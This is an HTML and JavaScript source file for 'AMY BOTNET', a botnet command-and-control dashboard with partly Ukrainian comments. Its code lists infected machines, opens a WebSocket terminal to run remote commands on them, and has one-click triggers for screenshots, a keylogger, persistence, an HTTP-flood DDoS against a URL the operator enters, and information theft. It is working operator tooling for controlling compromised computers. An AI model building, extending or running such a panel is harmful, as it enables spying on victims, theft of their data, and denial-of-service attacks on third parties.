<!DOCTYPE html>
<html lang="uk">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AMY BOTNET | Advanced C2 Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-red: #ff003c;
            --neon-green: #00ff41;
            --dark-bg: #050505;
            --glass-bg: rgba(15, 15, 15, 0.85);
        }

        body {
            background-color: var(--dark-bg);
            color: #e2e2e2;
            font-family: 'Fira Code', monospace;
            background-image: 
                radial-gradient(circle at 50% 50%, rgba(255, 0, 60, 0.05) 0%, transparent 70%),
                linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%),
                linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            background-size: 100% 100%, 100% 4px, 100% 100%;
            height: 100vh;
            overflow: hidden;
        }

        .orbitron { font-family: 'Orbitron', sans-serif; }

        .glass {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 0, 60, 0.2);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }

        .terminal {
            background: rgba(0, 0, 0, 0.9);
            height: calc(100vh - 280px);
            overflow-y: auto;
            padding: 20px;
            border: 1px solid rgba(0, 255, 65, 0.2);
            scrollbar-width: thin;
            scrollbar-color: var(--neon-red) transparent;
        }

        .terminal::-webkit-scrollbar { width: 4px; }
        .terminal::-webkit-scrollbar-thumb { background: var(--neon-red); border-radius: 10px; }

        .prompt { color: var(--neon-green); text-shadow: 0 0 5px rgba(0, 255, 65, 0.5); }
        .output { color: #cccccc; }
        .error { color: #ff3333; text-shadow: 0 0 5px rgba(255, 51, 51, 0.5); }
        .info { color: #00d2ff; }
        .path { color: #ffcc00; }

        .bot-card {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border-left: 3px solid transparent;
        }
        .bot-card.active {
            background: rgba(255, 0, 60, 0.1);
            border-left: 3px solid var(--neon-red);
            box-shadow: inset 0 0 20px rgba(255, 0, 60, 0.05);
        }

        .btn-action {
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.75rem;
            font-weight: bold;
        }
        .btn-action:hover {
            transform: translateY(-2px);
            box-shadow: 0 0 15px rgba(255, 0, 60, 0.4);
        }

        @keyframes scanline {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .scanline {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, transparent 0%, rgba(255, 0, 60, 0.03) 50%, transparent 100%);
            animation: scanline 8s linear infinite;
            pointer-events: none;
            z-index: 100;
        }

        .status-dot {
            width: 8px; height: 8px; border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px currentColor;
        }
    </style>
</head>

<body class="p-4 md:p-8">
    <div class="scanline"></div>

    <header class="mb-8 flex justify-between items-end">
        <div>
            <h1 class="orbitron text-4xl md:text-5xl font-bold text-red-600 tracking-tighter">
                AMY<span class="text-white opacity-20">_</span>BOTNET<span class="text-sm align-top text-red-400">V2.0</span>
            </h1>
            <p class="text-xs text-zinc-500 mt-2 uppercase tracking-widest">Advanced Command & Control Interface</p>
        </div>
        <div class="text-right">
            <div class="text-xs text-zinc-500 uppercase">System Status</div>
            <div class="text-green-500 font-bold flex items-center gap-2 justify-end">
                <span class="status-dot bg-green-500"></span> OPERATIONAL
            </div>
        </div>
    </header>

    <main class="grid grid-cols-12 gap-6 h-[calc(100vh-160px)]">
        <!-- Sidebar: Actions & Bot List -->
        <div class="col-span-12 lg:col-span-3 flex flex-col gap-4">
            <!-- Кнопки зверху -->
            <div class="glass p-4 rounded-lg shadow-inner">
                <h2 class="orbitron text-sm font-bold text-red-500 mb-3 uppercase">Quick Infiltration</h2>
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="takeScreenshot()" class="btn-action bg-zinc-900 border border-orange-500/50 text-orange-500 py-2 px-1 rounded hover:bg-orange-500/10 text-[11px]">📸 Vision</button>
                    <button onclick="startKeylogger()" class="btn-action bg-zinc-900 border border-yellow-500/50 text-yellow-500 py-2 px-1 rounded hover:bg-yellow-500/10 text-[11px]">⌨️ Keys</button>
                    <button onclick="addPersistence()" class="btn-action bg-zinc-900 border border-purple-500/50 text-purple-500 py-2 px-1 rounded hover:bg-purple-500/10 text-[11px]">🔒 Anchor</button>
                    <button onclick="startDDoS()" class="btn-action bg-zinc-900 border border-red-500/50 text-red-500 py-2 px-1 rounded hover:bg-red-500/10 text-[11px]">☠️ Strike</button>
                    <button onclick="stealInfo()" class="btn-action bg-zinc-900 border border-blue-500/50 text-blue-500 py-2 px-1 rounded hover:bg-blue-500/10 text-[11px]">🔍 Intel</button>
                </div>
            </div>

            <!-- Список ботів знизу -->
            <div class="glass p-4 rounded-lg flex-1 flex flex-col min-h-0">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="orbitron text-lg font-bold text-red-500">Nodes</h2>
                    <span class="bg-red-900/30 text-red-400 px-2 py-0.5 rounded text-xs border border-red-500/20">
                        <span id="count">0</span> ONLINE
                    </span>
                </div>
                
                <div id="botlist" class="space-y-2 overflow-y-auto pr-2 custom-scrollbar">
                    <p class="text-zinc-600 text-center py-8 text-sm italic">Scanning...</p>
                </div>
            </div>
        </div>

        <!-- Main Content: Terminal -->
        <div class="col-span-12 lg:col-span-9 flex flex-col gap-4">
            <div class="glass p-4 rounded-lg flex-1 flex flex-col min-h-0 relative">
                <div class="flex justify-between items-center mb-3">
                    <div class="flex items-center gap-3">
                        <div class="w-3 h-3 rounded-full bg-red-600"></div>
                        <h2 class="orbitron text-lg font-bold">Encrypted Session</h2>
                        <span id="target_id" class="text-zinc-500 text-xs ml-2">NO TARGET SELECTED</span>
                    </div>
                    <div id="terminal_status_container" class="flex items-center gap-2">
                        <span id="terminal_status_dot" class="status-dot bg-zinc-700"></span>
                        <span id="terminal_status" class="text-[10px] uppercase tracking-widest text-zinc-500">Idle</span>
                    </div>
                </div>

                <div id="terminal" class="terminal rounded border border-zinc-800/50 text-sm">
                    <div class="text-zinc-500 mb-2">Welcome to AMY-C2 v2.0.1-stable</div>
                    <div class="text-zinc-600 text-xs">Waiting for bot selection to establish websocket tunnel...</div>
                </div>

                <div class="mt-4 flex gap-2">
                    <div class="flex-1 relative">
                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-green-500 font-bold">$</span>
                        <input id="terminal_input"
                            class="w-full pl-10 pr-4 py-3 bg-black/50 border border-zinc-800 rounded focus:outline-none focus:border-red-500/50 transition-colors text-green-400 placeholder-zinc-700"
                            placeholder="Execute remote command..." autocomplete="off"
                            onkeypress="if(event.key === 'Enter') sendTerminalCmd()" onkeydown="handleKeyDown(event)">
                    </div>
                    <button onclick="sendTerminalCmd()"
                        class="bg-red-600 hover:bg-red-700 text-white px-8 py-3 rounded font-bold transition-all uppercase tracking-widest text-sm orbitron">
                        Execute
                    </button>
                </div>

                <div class="flex flex-wrap gap-2 mt-4">
                    <button onclick="quickCommand('whoami')" class="text-[10px] bg-zinc-900 border border-zinc-800 px-2 py-1 rounded hover:border-zinc-600 transition-colors">WHOAMI</button>
                    <button onclick="quickCommand('hostname')" class="text-[10px] bg-zinc-900 border border-zinc-800 px-2 py-1 rounded hover:border-zinc-600 transition-colors">HOSTNAME</button>
                    <button onclick="quickCommand('ipconfig')" class="text-[10px] bg-zinc-900 border border-zinc-800 px-2 py-1 rounded hover:border-zinc-600 transition-colors">IPCONFIG</button>
                    <button onclick="quickCommand('tasklist')" class="text-[10px] bg-zinc-900 border border-zinc-800 px-2 py-1 rounded hover:border-zinc-600 transition-colors">TASKLIST</button>
                    <button onclick="quickCommand('dir')" class="text-[10px] bg-zinc-900 border border-zinc-800 px-2 py-1 rounded hover:border-zinc-600 transition-colors">DIR</button>
                </div>

                <div class="flex gap-4 mt-4 text-[10px] uppercase tracking-widest text-zinc-600">
                    <button onclick="clearTerminal()" class="hover:text-zinc-300 transition-colors flex items-center gap-1"><span>[</span> Clear <span>]</span></button>
                    <button onclick="saveTerminalLog()" class="hover:text-zinc-300 transition-colors flex items-center gap-1"><span>[</span> Save Log <span>]</span></button>
                    <button onclick="reconnectTerminal()" class="hover:text-zinc-300 transition-colors flex items-center gap-1"><span>[</span> Reset Tunnel <span>]</span></button>
                </div>
            </div>
        </div>
    </main>

    <script>
        let currentBot = "";
        let terminalWs = null;
        let commandHistory = [];
        let historyIndex = -1;

        async function updateBots() {
            try {
                const res = await fetch('/bots');
                const data = await res.json();
                document.getElementById('count').textContent = data.bots.length;

                const botList = document.getElementById('botlist');
                let html = '';
                if (data.bots.length === 0) {
                    html = '<p class="text-zinc-600 text-center py-8 text-sm italic">Scanning for active nodes...</p>';
                } else {
                    data.bots.forEach(id => {
                        const isActive = id === currentBot ? 'active' : '';
                        html += `
                            <div onclick="selectBot('${id}')" class="bot-card ${isActive} bg-zinc-900/50 p-3 rounded border border-zinc-800 cursor-pointer hover:bg-zinc-800/50 group">
                                <div class="flex justify-between items-center">
                                    <span class="text-sm font-bold text-zinc-300 group-hover:text-red-400 transition-colors">${id}</span>
                                    <span class="status-dot bg-green-500 scale-75"></span>
                                </div>
                                <div class="text-[10px] text-zinc-600 mt-1 uppercase tracking-tighter">Connection: Encrypted WebSocket</div>
                            </div>`;
                    });
                }
                botList.innerHTML = html;
            } catch (err) {
                console.error("Failed to fetch bots:", err);
            }
        }

        function selectBot(id) {
            if (currentBot === id) return;
            currentBot = id;
            document.getElementById('target_id').textContent = id.toUpperCase();
            
            const term = document.getElementById('terminal');
            term.innerHTML += `<div class="info mt-2"> Establishing tunnel to node ${id}...</div>`;
            
            updateBots(); // Refresh UI to show active state
            connectTerminal();
        }

        function connectTerminal() {
            if (terminalWs) terminalWs.close();

            const statusText = document.getElementById('terminal_status');
            const statusDot = document.getElementById('terminal_status_dot');
            
            statusText.textContent = "Negotiating...";
            statusText.className = "text-[10px] uppercase tracking-widest text-yellow-500";
            statusDot.className = "status-dot bg-yellow-500";

            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
            terminalWs = new WebSocket(`${proto}//${location.host}/terminal/${currentBot}`);

            terminalWs.onopen = () => {
                statusText.textContent = "Tunnel Active";
                statusText.className = "text-[10px] uppercase tracking-widest text-green-500";
                statusDot.className = "status-dot bg-green-500";
                
                const term = document.getElementById('terminal');
                term.innerHTML += `<div class="info"> Tunnel established. Ready for instructions.</div>`;
                autoScroll();
            };

            terminalWs.onmessage = function (event) {
                const line = document.createElement('div');
                let text = event.data;

                if (text.startsWith("[SYSTEM]")) {
                    line.className = 'info text-xs italic opacity-80';
                } else if (text.startsWith("[KEYLOG]")) {
                    line.className = 'info text-yellow-500/80';
                } else if (text.toLowerCase().includes("error") || text.toLowerCase().includes("failed") || text.toLowerCase().includes("access denied")) {
                    line.className = 'error';
                } else if (text.includes("C:\\") || text.includes("/") || text.includes(":\\")) {
                    line.className = 'path';
                } else {
                    line.className = 'output';
                }

                line.textContent = text;
                document.getElementById('terminal').appendChild(line);
                autoScroll();
            };

            terminalWs.onclose = () => {
                statusText.textContent = "Tunnel Collapsed";
                statusText.className = "text-[10px] uppercase tracking-widest text-red-500";
                statusDot.className = "status-dot bg-red-500";
            };
        }

        function sendTerminalCmd() {
            const input = document.getElementById('terminal_input');
            const cmd = input.value.trim();
            if (!cmd) return;
            
            if (!currentBot) {
                const line = document.createElement('div');
                line.className = 'error';
                line.textContent = "Error: No target selected. Select a node from the sidebar.";
                document.getElementById('terminal').appendChild(line);
                return;
            }

            if (commandHistory[commandHistory.length - 1] !== cmd) {
                commandHistory.push(cmd);
            }
            historyIndex = commandHistory.length;

            if (terminalWs && terminalWs.readyState === WebSocket.OPEN) {
                terminalWs.send(cmd);
                
                const line = document.createElement('div');
                line.className = 'mt-2 mb-1';
                line.innerHTML = `<span class="prompt">$ ${cmd}</span>`;
                document.getElementById('terminal').appendChild(line);
                autoScroll();
                input.value = "";
            } else {
                const line = document.createElement('div');
                line.className = 'error';
                line.textContent = "Error: Tunnel not established or lost. Attempting to reconnect...";
                document.getElementById('terminal').appendChild(line);
                reconnectTerminal();
            }
        }

        function handleKeyDown(e) {
            const input = document.getElementById('terminal_input');
            if (e.key === "Tab") {
                e.preventDefault();
                const current = input.value.trim().toLowerCase();
                const suggestions = ["whoami", "hostname", "ipconfig", "netstat -ano", "tasklist", "systeminfo", "dir", "cd", "powershell", "curl"];
                const match = suggestions.find(cmd => cmd.startsWith(current));
                if (match) input.value = match;
            } else if (e.key === "ArrowUp") {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = commandHistory[historyIndex];
                }
            } else if (e.key === "ArrowDown") {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    input.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    input.value = "";
                }
            }
        }

        function autoScroll() {
            const terminal = document.getElementById('terminal');
            terminal.scrollTop = terminal.scrollHeight;
        }

        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '<div class="text-zinc-600 text-[10px]">Buffer cleared. Session active.</div>';
        }

        function saveTerminalLog() {
            const terminal = document.getElementById('terminal');
            const text = terminal.innerText;
            const blob = new Blob([text], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `AMY_LOG_${currentBot || 'SESSION'}_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function reconnectTerminal() {
            if (currentBot) connectTerminal();
        }

        function quickCommand(cmd) {
            document.getElementById('terminal_input').value = cmd;
            sendTerminalCmd();
        }

        // Action Triggering
        async function apiTrigger(endpoint, botId) {
            const id = botId || currentBot;
            if (!id) {
                alert("Please select a target node first.");
                return;
            }
            try {
                const res = await fetch(`/${endpoint}/${id}`);
                const data = await res.json();
                if (data.status === "triggered") {
                    console.log(`${endpoint} triggered for ${id}`);
                } else {
                    alert(`Error: ${data.error || 'Failed to trigger'}`);
                }
            } catch (err) {
                console.error(err);
            }
        }

        function takeScreenshot() { apiTrigger('screenshot'); }
        function startKeylogger() { apiTrigger('keylogger'); }
        function addPersistence() { apiTrigger('persistence'); }
        
        function startDDoS() {
            const target = prompt("Target URL for HTTP flood (include http/https)", "http://example.com");
            if (!target) return;
            apiTrigger(`ddos?target=${encodeURIComponent(target)}`);
            const term = document.getElementById('terminal');
            term.innerHTML += `<div class="info mt-2"> [SYSTEM] DDoS Attack initiated against ${target}</div>`;
        }

        function stealInfo() {
            apiTrigger('steal');
            const term = document.getElementById('terminal');
            term.innerHTML += `<div class="info mt-2"> [SYSTEM] Requesting system report...</div>`;
        }

        // Initialize
        setInterval(updateBots, 3000);
        updateBots();
    </script>
</body>

</html>
